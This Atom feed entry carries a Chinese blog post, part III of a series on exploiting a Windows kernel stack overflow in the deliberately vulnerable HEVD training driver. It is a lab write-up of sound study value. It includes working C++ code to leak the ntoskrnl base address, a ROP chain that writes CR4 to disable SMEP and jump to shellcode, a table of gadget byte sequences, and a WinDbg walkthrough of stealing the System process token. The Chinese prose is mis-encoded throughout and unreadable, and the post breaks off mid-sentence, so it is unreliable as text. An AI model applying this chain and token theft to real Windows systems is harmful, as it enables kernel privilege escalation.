<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabinet</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2024-01-25T07:42:10.015Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä»é›¶æ¢ç´¢ç°ä»£windowså†…æ ¸æ ˆæº¢å‡º-ä»¥HEVDç»ƒä¹ ä¸ºä¾‹</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/</id>
    <published>2024-01-25T07:07:41.000Z</published>
    <updated>2024-01-25T07:42:10.015Z</updated>
    
    <content type="html"><![CDATA[<hr /><p>ä¸Šï¼š<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</a></p><p>ä¸­ï¼š<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</a></p><p>æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š<a href="https://xz.aliyun.com/t/13365">https://xz.aliyun.com/t/13365</a></p><span id="more"></span><p>ä¸­ç¯‡çš„å†…å®¹ä¸€è·¯èµ°æ¥å®å±ä¸æ˜“ï¼Œæœ¬é™„å½•å¯¹ç¬¬äºŒç« çš„ä»¥ä¸‹å‡ ä¸ªé—ç•™é—®é¢˜åšå‡ºè¯´æ˜</p><ul><li>userç¼–ç¨‹å¯»æ‰¾ROPGadget</li><li>shellcodeç¼–å†™</li><li>Tokenææƒ</li><li>KVAS</li></ul><h1 id="userç¼–ç¨‹å¯»æ‰¾ropgadget"><a class="markdownIt-Anchor" href="#userç¼–ç¨‹å¯»æ‰¾ropgadget"></a> userç¼–ç¨‹å¯»æ‰¾ROPGadget</h1><p>ROPå…¨ç§°åŠ è¿”å›å¯¼å‘æ€§ç¼–ç¨‹ï¼Œæ¯”å¦‚è¿™ä¸€ç« ç”¨åˆ°çš„Gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mov cr4, rcx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>å…³äº<code>ret</code>æ±‡ç¼–æœ¬è´¨ä¸Šå°±æ˜¯ä»æ ˆå¸§ä¸­å–å‡ºå€¼ï¼Œç„¶åå°†<code>ip</code>å¯„å­˜å™¨è®¾ç½®ä¸ºè¯¥å€¼ï¼Œç­‰ä»·äº<code>pop ip</code>ï¼Œè¿™æ ·å°±èƒ½å®Œæˆå‡½æ•°è°ƒç”¨çš„è¿”å›ç­‰ç­‰ã€‚</p><p>æœ¬ç« ä¸­å½“æˆ‘ä»¬å‘ç”Ÿæ ˆæº¢å‡ºæ—¶ï¼Œå°±ä¼šæŠŠ<code>ret</code>çš„ä½ç½®è®¾ç½®ä¸ºç¬¬ä¸€æ®µgadgetçš„ä½ç½®</p><ul><li><code>pop rcx</code>å°±ä¼šå°†æ­¤æ—¶æ ˆé¡¶çš„å€¼<code>0x00000000002506f8</code>å­˜å…¥<code>rcx</code>å¯„å­˜å™¨ï¼Œç„¶å<code>ret</code>åˆä»æ ˆé¡¶å–å‡ºåœ°å€<code>mov_rc4_rcx_ret</code>ï¼Œç„¶å<code>rip</code>å¯„å­˜å™¨å°±è·³è½¬æ‰§è¡Œäº†</li><li><code>mov rc4, rcx</code>å°†<code>rcx</code>å€¼å­˜å…¥<code>rc4</code>ä¸­ç„¶å<code>ret</code>åˆå°†æ ˆé¡¶çš„å€¼<code>shellcode_addr</code>è®¾ç½®ä¸º<code>rip</code>å¯„å­˜å™¨çš„å€¼åè¿”å›</li></ul><p>ç»†å¿ƒä¸€ç‚¹å°±ä¼šå‘ç°æœ¬ç« æˆªå›¾ä¸­çš„åœ°å€ä¸ä¸€æ ·ï¼Œå› ä¸ºå†…æ ¸åŠ è½½æ—¶çš„å†…å­˜è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯éšæœºåŒ–çš„ï¼Œä¸è¿‡å¯»å€æ–¹å¼ä¾æ—§æ˜¯<code>åŸºåœ°å€</code>+<code>åç§»</code></p><p>è¿™å°±å¼•ç”³å‡ºå‡½æ•°ç¬¬ä¸€æ®µä»£ç ï¼šæ‰¾åˆ°å†…æ ¸çš„åŸºåœ°å€</p><h2 id="aæ‰¾åˆ°å†…æ ¸åŸºåœ°å€"><a class="markdownIt-Anchor" href="#aæ‰¾åˆ°å†…æ ¸åŸºåœ°å€"></a> A.æ‰¾åˆ°å†…æ ¸åŸºåœ°å€</h2><p>é€šè¿‡<code>NtQuerySystemInformation </code>è¿™ä¸ªâ€œåŠéšè—â€å‡½æ•°å®ç°çš„</p><p>MSDNï¼š<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in, out] SystemInformation</span><br></pre></td></tr></table></figure><p>æŒ‡å‘æ¥æ”¶è¯·æ±‚ä¿¡æ¯çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚ æ­¤ä¿¡æ¯çš„å¤§å°å’Œç»“æ„å›  <em>SystemInformationClass</em> å‚æ•°çš„å€¼è€Œå¼‚ï¼š</p></blockquote><p>å¾ˆå¯æƒœï¼Œå…³äº<code>SystemInformationClass</code>å¾®è½¯å¹¶æ²¡æœ‰å…¬å¼€å®ƒçš„è®¾è®¡ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…³äºæ­¤çš„èµ„æ–™</p><p><code>SYSTEM_INFORMATION_CLASS</code>ï¼š<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm</a></p><p>ä»–æ˜¯ä¸€ä¸ªæšä¸¾ï¼Œå…¶ä¸­<code>0xB</code>å°±ä»£è¡¨ç€è¦æŸ¥è¯¢çš„æ˜¯<code>SystemModuleInformation</code></p><p><code>SYSTEM_MODULE</code>ï¼š<a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html">http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_MODULE</span> &#123;</span><br><span class="line">  ULONG                Reserved1;</span><br><span class="line">  ULONG                Reserved2;</span><br><span class="line">  PVOID                ImageBaseAddress;</span><br><span class="line">  ULONG                ImageSize;</span><br><span class="line">  ULONG                Flags;</span><br><span class="line">  WORD                 Id;</span><br><span class="line">  WORD                 Rank;</span><br><span class="line">  WORD                 w018;</span><br><span class="line">  WORD                 NameOffset;</span><br><span class="line">  BYTE                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125; SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br></pre></td></tr></table></figure><p><code>SystemInformation</code>å°±æ˜¯ç”±<code>SYSTEM_MODULE</code>æ•°ç»„ä½œä¸ºæˆå‘˜çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªæ²¡æœ‰å®˜æ–¹æ–‡æ¡£ï¼Œä¹Ÿæ˜¯é€šè¿‡é€†å‘å¾—åˆ°çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">ULONG                ModulesCount;</span><br><span class="line">SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure><p>å…³äºæŸ¥è¯¢å‡½æ•°çš„å®šä¹‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span></span>;</span><br></pre></td></tr></table></figure><ol><li>é¦–å…ˆä»<code>ntdll</code>å¯¼å…¥å‡½æ•°</li><li>ç„¶ååˆå§‹åŒ–å˜é‡</li><li>æŸ¥è¯¢åæ‰“å°å¹¶è¿”å›ï¼Œå¦‚æœæ²¡æœ‰æŸ¥åˆ°å°±è¿”å›0</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span> </span>&#123;</span><br><span class="line">PVOID kernelImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PCHAR kernelImage = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//import function `NtQuerySystemInformation`</span></span><br><span class="line">HMODULE ntdll = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;ntdll&quot;</span>));</span><br><span class="line">PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(ntdll, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress() failed.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//init length</span></span><br><span class="line">ULONG len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;len);</span><br><span class="line"><span class="comment">//init module infomations</span></span><br><span class="line">PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)<span class="built_in">GlobalAlloc</span>(GMEM_ZEROINIT, len);</span><br><span class="line"><span class="keyword">if</span> (pModuleInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase]  Could not allocate memory for module info.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//starting quering</span></span><br><span class="line">NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, pModuleInfo, len, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n&quot;</span>, status);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123;</span><br><span class="line">kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(kernelImage, ModuleName)) &#123;</span><br><span class="line">kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] [ulGetKernelBase]  Mod name %s &quot;</span>, kernelImage);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%llx\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%X\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)kernelImageBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="b-æ‰¾åˆ°å¯¹åº”æ±‡ç¼–"><a class="markdownIt-Anchor" href="#b-æ‰¾åˆ°å¯¹åº”æ±‡ç¼–"></a> B. æ‰¾åˆ°å¯¹åº”æ±‡ç¼–</h2><p>å¯ä»¥ä½¿ç”¨CTFå¸¸ç”¨å·¥å…·<code>ROPGadget</code>ï¼Œä»–æ”¯æŒ<code>PE</code>æ ¼å¼ï¼ˆå› ä¸ºç”¨çš„Capstoneåæ±‡ç¼–å¼•æ“ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><p>è¯•è¯•<code>ntoskrl.exe</code>çš„</p><p><img src="https://img.joe1sn.top/uploads/big/5932a20543fd1420ae321f901e1f4c44.png" alt="image-20240119172454699" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000014039eb47 : mov cr4, rcx ; ret</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åŸºåœ°å€æ˜¯<code>0x39eb47</code>ï¼Œå¦å¤–ä¸€ä¸ªgadgetåŒç†</p><p>é‡å†™ä¿®æ”¹ä¸‹EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx = base+ <span class="number">0x20C64C</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_cr4_rcx = base+ <span class="number">0x39eb47</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx;</span><br><span class="line"><span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_cr4_rcx;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/14da4b6cf8f39c3a16855b7a20fbf476.png" alt="image-20240119174839482" /></p><p><img src="https://img.joe1sn.top/uploads/big/6c94aaf54fc86ee593668486a2df81a4.png" alt="image-20240119174924327" /></p><p>ä¸€äº›å¸¸è§çš„gadgetå­—èŠ‚åºåˆ—</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;RET&quot;</span> , &#123; <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RCX&quot;</span>, &#123; <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_CR4_RCX&quot;</span>, &#123; <span class="number">0x0f</span>, <span class="number">0x22</span>, <span class="number">0xe1</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;NOP&quot;</span>, &#123; <span class="number">0x4d</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX_POP_RCX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RCX_PTRRAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x08</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RAX_PTRRCX&quot;</span>, &#123; <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_RAX_RAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_ESI_ESI&quot;</span>, &#123; <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³ç›´æ¥ä»äºŒè¿›åˆ¶è¯»å–ï¼ˆè¿™æ ·æ›´å¿«ï¼‰å¯ä»¥ä½¿ç”¨ï¼š<a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a> æä¾›çš„æ€è·¯å»æ‰¾</p><h1 id="shellcodeç¼–å†™"><a class="markdownIt-Anchor" href="#shellcodeç¼–å†™"></a> shellcodeç¼–å†™</h1><h2 id="a-æ‰‹åŠ¨è¿›è¡Œtokenææƒ"><a class="markdownIt-Anchor" href="#a-æ‰‹åŠ¨è¿›è¡Œtokenææƒ"></a> A. æ‰‹åŠ¨è¿›è¡ŒTokenææƒ</h2><p>ç¬¬äºŒç« ä¸­ä½¿ç”¨çš„æ˜¯ä»–äººæä¾›çš„shellcodeï¼Œè¿™é‡Œå°è¯•è‡ªå·±å†™æ±‡ç¼–</p><p>æ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬å·²ç»è¿›å…¥å†…æ ¸äº†ï¼Œæ‰€ä»¥åšçš„äº‹æƒ…å’Œuserçº§åˆ«ä¸ä¸€æ ·</p><p>åŒ<code>KRPOCESS</code>ä¸åŒçš„æ˜¯<code>EPROCESS</code>æè¿°äº†ç¨‹åºè¿è¡Œçš„ç›¸å…³ç¯å¢ƒï¼Œä¾‹å¦‚ï¼šå¯¹åº”çš„<code>KPROCESS</code>æŒ‡é’ˆã€ç¨‹åºçš„æƒé™ç­‰</p><p>åœ¨windbgä¸­ä½¿ç”¨ ï¼Œå¯ä»¥åˆ—ä¸¾æ‰€æœ‰çš„è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!process 0 0 &lt;process_name&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d79ca59d6f4e93813d144c57ed739409.png" alt="image-20240119180801648" /></p><p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹å¯¹åº”çš„EPROCESSç»“æ„ä½“ï¼Œè¿™é‡ŒæŸ¥çœ‹<code>System</code>è¿›ç¨‹çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt nt!_EPROCESS &lt;Process address&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab3f24cc80b2f59949d0f14718347944.png" alt="image-20240119181007630" /></p><p><img src="https://img.joe1sn.top/uploads/big/e55eccd39e6efc555de0f0b2aae95b32.png" alt="image-20240119181255215" /></p><p>Tokenæ˜¯ä¸€ä¸ª<code>_EX_FAST_REF</code>ç±»å‹çš„Unionå€¼</p><p><img src="https://img.joe1sn.top/uploads/big/197b66077a9385505b318f09962398af.png" alt="image-20240119181935137" /></p><p><code>RefCnt</code>è®°å½•äº†Tokenå¼•ç”¨çš„æ•°ç›®ï¼Œæ˜¯æ•°æ®çš„ä½4ä½(64ä½ä¸­ï¼Œ32ä½æ˜¯3ä½)</p><p>å°†å½“å‰è¿›ç¨‹çš„é™¤<code>RefCnt</code>ä»¥å¤–çš„å…¶ä»–bitä½è®¾ç½®ä¸ºå’ŒSystemçš„ä¸€è‡´å°±è¡Œäº†ï¼Œ</p><p>è¿™é‡Œ <code>Value</code>ä¸æ©ç <code>-0xd</code>ï¼ˆRefCountï¼‰è¿›è¡Œ<code>&amp;</code>è¿ç®—å°±èƒ½å¾—åˆ°çœŸå®çš„Tokenå€¼</p><p><img src="https://img.joe1sn.top/uploads/big/3783b0486f34520cceef6f7e7d4bc37b.png" alt="image-20240119183143972" /></p><p>ç°åœ¨å°†è®¡ç®—å‡ºçš„Tokenå€¼å¤åˆ¶ç»™cmd.exeï¼ˆ<strong>è¿™æ˜¯ä¸€ä¸ªæ–°çš„Token</strong>ï¼‰</p><p><img src="https://img.joe1sn.top/uploads/big/bd96556683f06ae537f449787700abd7.png" alt="image-20240119183328877" /></p><p><img src="https://img.joe1sn.top/uploads/big/84780c5e389c5cc5645419cd3ec999ec.png" alt="image-20240119183538886" /></p><p><img src="https://img.joe1sn.top/uploads/big/9345344e4adc9083467b09c76f86fa74.png" alt="image-20240119183521964" /></p><p><img src="https://img.joe1sn.top/uploads/big/9ad936fd2b23d649493103c25b0cad43.png" alt="image-20240119183609699" /></p><h2 id="b-è¿›è¡Œshellcodeç¼–å†™"><a class="markdownIt-Anchor" href="#b-è¿›è¡Œshellcodeç¼–å†™"></a> B. è¿›è¡ŒShellcodeç¼–å†™</h2><p>åœ¨åˆšæ‰çš„<code>EPROCESS</code>ä¸­ï¼Œæœ‰ä¸€æ®µè®°å½•çš„æ˜¯ç¨‹åºçš„é“¾è¡¨ï¼š<code>ActiveProcessLinks</code>ï¼Œè€Œä¸”windowsä¼šç”Ÿæˆä¸€æ®µç‹¬ç‰¹çš„æ ‡è¯†æ¥æ ‡è®°æ¯ä¸€ä¸ªç¨‹åºï¼š<code>UniqueProcessId</code>ï¼Œåœ¨è¿™æ®µ <strong>åŒå‘</strong> é“¾è¡¨ä¸Šæ¯æ®µç¨‹åºéƒ½å¯ä»¥è¢«æ‰¾åˆ°ï¼Œå› ä¸ºå¯ä»¥å‘å‰å’Œå‘åæŸ¥æ‰¾ï¼Œ<strong>ä¸€èˆ¬Systemä½äºé“¾è¡¨å¼€å¤´ï¼Œæ‰€ä»¥æ²¿ç€FlinkæŸ¥æ‰¾</strong></p><p><img src="https://img.joe1sn.top/uploads/big/f5708429025f321352aa000e50780c46.png" alt="image-20240119193844612" /></p><p><img src="https://img.joe1sn.top/uploads/big/0595f0087054b0dca2dee10c43392202.png" alt="image-20240119193859162" /></p><p><img src="https://img.joe1sn.top/uploads/big/6065735bb4a5fd9a9d01cdf05b408bc7.png" alt="image-20240119194420366" /></p><ol><li><p>é€šè¿‡<code>EPROCESS</code>è·å¾—è‡ªèº«<code>ActiveProcessLinks</code>ï¼ŒåŒæ—¶å‘å‰/å‘åæŸ¥æ‰¾</p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">è¿™ç¯‡æ–‡ç« </a>ä¸­é€šè¿‡æ¨¡ä»¿<code>PsGetCurrentProcess</code>ï¼Œ<code>gs:[188h]</code>æŒ‡å‘çš„æ˜¯ä¸€ä¸ª<code>_KTHREAD </code>ï¼Œå‡½æ•°çš„æ±‡ç¼–ä¼šå°†è¿™ä¸ªåœ°å€<code>add addr,0xb8</code>ï¼Œå°±å¾—åˆ°äº†å½“å‰è¿›ç¨‹çš„<code>_EPROCESS</code>ï¼Œè¿™ä¹Ÿæ˜¯è®¸å¤šshellcodeçš„æŠ€å·§</p><p><img src="https://img.joe1sn.top/uploads/big/7d19f373ab80dd77cee7f9bafa5963c9.png" alt="image-20240120111712416" /></p><p><img src="https://img.joe1sn.top/uploads/big/74dee9c22c569abe177a9d8a2227fa80.png" alt="image-20240120112417119" /></p><p><code>ffff9984d3d97080 </code>å°±ä¸ºä¸€ä¸ª å½“å‰è¿›ç¨‹çš„<code>KiInitialThread </code></p><p><code>+0xB8</code>æŒ‡å‘çš„æ˜¯å½“å‰è¿›ç¨‹çš„<code>EPROCESS</code>äº†</p><p><img src="https://img.joe1sn.top/uploads/big/264e3eb8c9addd711fc3d6642ba7917a.png" alt="image-20240120112153274" /></p><p><img src="https://img.joe1sn.top/uploads/big/253b49550220b0df56641a0ce6cd73b2.png" alt="image-20240120112206849" /></p></li><li><p>æ¯”è¾ƒå½“å‰<code>ActiveProcessLinks</code>å€¼<code>-8</code>çš„å†…å­˜åœ°å€æ˜¯å¦ä¸º<code>UniqueProcessId</code></p></li><li><p>å¦ï¼šæ›´æ¢å½“å‰ç»“æ„ä½“ä¸ºä¸‹ä¸€ä¸ª</p></li><li><p>æ˜¯ï¼šä»<code>ActiveProcessLinks-0x70</code>çš„ä½ç½®å¾—åˆ°<code>Token</code>åœ°å€</p></li><li><p>è§£æTokenï¼Œèµ‹å€¼ç»™<strong>å½“å‰è¿›ç¨‹</strong>ï¼ˆWindowsä¼šè‡ªåŠ¨è§£æä¸ºexpçš„ç¨‹åºï¼ˆä»é¡µè¡¨æ˜ å°„ç­‰æ¥çœ‹ç¡®å®åº”è¯¥å¦‚æ­¤ï¼‰ï¼‰</p></li></ol><p>ä»”ç»†é€†å‘ä¼šå‘ç°</p><p><img src="https://img.joe1sn.top/uploads/big/e3e923aeebb6ddde277f7232637d651d.png" alt="image-20240120105543669" /></p><p>é‚£ä¹ˆåœ¨æ²¡æœ‰ä»»ä½•æ ˆå˜åŠ¨çš„æƒ…å†µä¸‹<code>add rsp, 0x28</code>å°±èƒ½æ¢å¤æ 